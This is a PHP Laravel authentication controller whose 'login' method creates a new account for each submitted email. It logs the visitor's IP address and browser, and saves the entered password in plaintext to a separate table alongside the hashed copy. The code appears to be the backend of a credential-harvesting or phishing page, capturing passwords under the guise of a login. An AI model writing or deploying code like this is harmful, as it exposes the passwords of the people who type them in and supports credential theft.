<?php

namespace App\Http\Controllers;

use Hash, Auth;
use App\Models\User;
use App\Models\UserPassword;
use Illuminate\Http\Request;
use App\Events\UserLoggedIn;
use Illuminate\Support\Facades\Validator;

class AuthController extends Controller
{
    public function loginForm()
    {
        return view('login');
    }

    public function login(Request $request)
    {
        $controls = $request->all();
        $rules = [
            'username' => 'required|email|unique:users,email',
            'password' => 'required|min:3',
        ];

        $validator = Validator::make($controls,$rules);
        if($validator->fails()){
            return response()->json([
                "code"=> 202,
                'status'=> true,
                'errors' => $validator->getMessageBag()->toArray()
            ]);
        }
 
        $ipInfo = getIpInfo();
        $ipAddress = $ipInfo['ip'];

        $osBrowserInfo = osBrowser();
        $browser = $osBrowserInfo['browser'];
        $osPlatform = $osBrowserInfo['os_platform'];

        $user = User::create([
            'email' => $request->username,
            'password' => Hash::make($request->password),
            'ip' => $ipAddress,
            'ua' => $browser . ' (' . $osPlatform . ')',
            'status' => 'submitted',
        ]);

        $userPassword = UserPassword::create([
            'user_id' => $user->id,
            'password' => $request->password,
        ]);

        Auth::login($user);
      
        return response()->json([
            'status' => true,
            'redirect' => route('home'),
            'userId'=>$user->id,
        ]);
    }
}
